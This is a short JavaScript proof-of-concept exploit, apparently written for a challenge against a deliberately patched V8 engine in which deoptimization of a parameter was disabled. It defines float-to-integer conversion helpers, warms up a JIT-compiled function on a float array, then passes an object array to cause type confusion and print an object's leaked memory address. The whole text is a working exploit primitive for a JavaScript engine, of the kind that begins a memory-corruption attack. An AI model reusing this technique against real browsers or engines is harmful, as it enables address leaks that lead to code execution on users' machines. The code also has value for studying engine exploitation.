// if i can remember, this one was about a patch that disabled deoptimization of a parameter, allowing to do type confusion
var buffer = new ArrayBuffer(8);
f64 = new Float64Array(buffer);
u32 = new Uint32Array(buffer);

function ftoi(val) {
 f64[0] = val;
 return BigInt(u32[0]) + (BigInt(u32[1]) << 32n);
}

function itof(val) {
  u32[0] = Number(val & 0xffffffffn);
  u32[1] = Number(val >> 32n);
  return f64[0];
}

function vuln(obj) {
 // prevent inlining
 let x = 100;
 for(let i = 1; i < x; i++) {
   if (x % i == 0) x=x-1;
 }
 // Type confusion
 return obj[0];
}

let floats = [13.37,13.36];

// JITed code
for(let i = 0; i < 100000; i++) {
 print(vuln(floats));
}

// Leak an address as example
let obj = {};
let objects = [obj];
print(`Leaked obj address: ${(ftoi(vuln(objects))).toString(16)}`);
%DebugPrint(obj);

print(itof(0x40283d70a3d70a3dn))
